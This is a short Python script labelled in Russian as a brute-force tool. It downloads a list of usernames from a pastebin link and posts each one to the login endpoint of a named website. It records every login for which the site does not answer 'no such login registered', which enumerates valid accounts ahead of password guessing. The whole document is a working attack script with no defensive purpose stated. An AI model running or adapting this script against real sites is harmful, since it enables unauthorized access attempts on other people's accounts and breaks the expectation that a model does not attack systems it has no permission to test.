#брутфорс
import requests
good_logins = []
resp = requests.post('http://idil24.space/login', json = {'login': '123', 'password': '123456'})
users = requests.get('https://pastebin.com/raw/5GB1B8iz').text
for login in users.split('\r\n'):
	resp = requests.post('http://idil24.space/login', json = {'login': login, 'password': 'ohroghusotihu'})
	if resp.text != 'Такой логин не зарегистрирован.':
		print(login, resp.text)
		good_logins.append(login)